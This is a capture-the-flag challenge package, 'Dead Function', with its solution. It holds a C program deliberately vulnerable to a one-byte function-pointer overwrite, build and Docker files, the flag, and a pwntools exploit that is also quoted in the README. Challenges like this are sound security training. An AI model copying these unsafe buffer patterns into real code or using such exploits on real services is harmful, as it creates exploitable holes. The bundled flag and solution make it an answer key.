{
    "dead_func.c": "#include <stdio.h>\n#include <stdlib.h>\n\n\n\nvoid two()\n{\n    printf(\"This is function two!\\n\");\n}\n\nvoid print_flag()\n{\n    printf(\"This function is still under development.\\n\");\n    FILE* fp = fopen(\"flag.txt\", \"r\");\n    char ch;\n    while((ch = getc(fp)) != EOF)\n        printf(\"%c\",ch);\n    printf(\"\\n\");\n}\n\nvoid one()\n{\n    printf(\"This is function one!\\n\");\n}\n\nvoid select_func(char* inp)\n{\n    void (*func)() = &two;\n    char buf[30];\n    strncpy(buf, inp, 31);\n    if(strcmp(buf,\"one\") == 0)\n        func = &one;\n    (*func)();\n}\n\nint main()\n{\n    setvbuf(stdout,_IONBF,0,0);\n    printf(\"Which function would you like to call?\\n\");\n    char inp[31];\n    gets(inp);\n    select_func(inp);\n}\n",
    "dead_pwn.py": "from pwn import *\n\np = remote('172.17.0.2', 4322)\n#p = process('./dead_func')\npayload = 'A'*30 + '\\xd8'\n\np.send(payload + '\\n')\np.interactive()\n",
    "Dockerfile": "FROM 32bit/ubuntu:16.04\n\nRUN apt update\nRUN apt install -y socat\n\nRUN groupadd ctf\n\nRUN mkdir /pwn\n\nCOPY entry.sh /entry.sh\nCOPY pwn2 /pwn/pwn2\nCOPY flag.txt /pwn/flag.txt\n\nRUN useradd -G ctf --home=/pwn pwnuser\nRUN useradd -G ctf --home=/pwn pwnflag\n\nRUN chown pwnflag:pwnflag /pwn/flag.txt\nRUN chown pwnflag:pwnflag /pwn/pwn2\n\nRUN chmod 4755 /pwn/pwn2\nRUN chmod 444 /pwn/flag.txt\n\nEXPOSE 4322\nCMD [\"./entry.sh\"]\n",
    "entry.sh": "#!/bin/bash\n\nwhile :\ndo\n    su -c \"socat TCP4-listen:4322,reuseaddr,fork EXEC:/pwn/pwn2\" - pwnuser\ndone\n",
    "flag.txt": "gigem{4ll_17_74k35_15_0n3}\n",
    "Makefile": "all: pwn\n\npwn: dead_func.c\n\tgcc -O0 -fno-stack-protector dead_func.c -o pwn2 -m32\n",
    "pwn2": "[Binary file or unsupported type: c:\\users\\jomue\\tamuctf-2019-master\\tamuctf-2019-master\\pwn\\pwn2\\pwn2]",
    "README.md": "# Dead Function\n\n## Challenge\n\n`nc pwn.tamuctf.com 4322`\n\n## Setup\nBuild the container with `docker build -t pwn2 .` and run it with `docker run -it --rm pwn2`\n\n## Solution\nThe solution is to overwrite the last byte of the function pointer with that of the last byte of `print_flag()`. An example solution script can be found below:  \n```python\nfrom pwn import *\n\np = remote('172.17.0.2', 4322)\n#p = process('./pwn2')\npayload = 'A'*30 + '\\xd8'\n\np.send(payload + '\\n')\np.interactive()\n```\n",
    "category": "Pwn"
}